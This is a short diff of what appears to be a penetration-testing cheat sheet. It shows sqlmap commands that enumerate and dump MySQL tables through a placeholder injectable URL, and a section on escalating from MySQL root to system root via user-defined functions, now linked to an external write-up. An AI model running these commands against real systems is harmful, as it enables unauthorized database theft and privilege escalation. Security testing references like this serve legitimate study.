@@ -87,7 +87,7 @@ sqlmap
     sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --tables 
     sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --T [tb_name] --dump
 
-MySQL Root to System Root with lib_mysqludf_sys
+[MySQL Root to System Root](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)
 
     use mysql;
     select * from func;
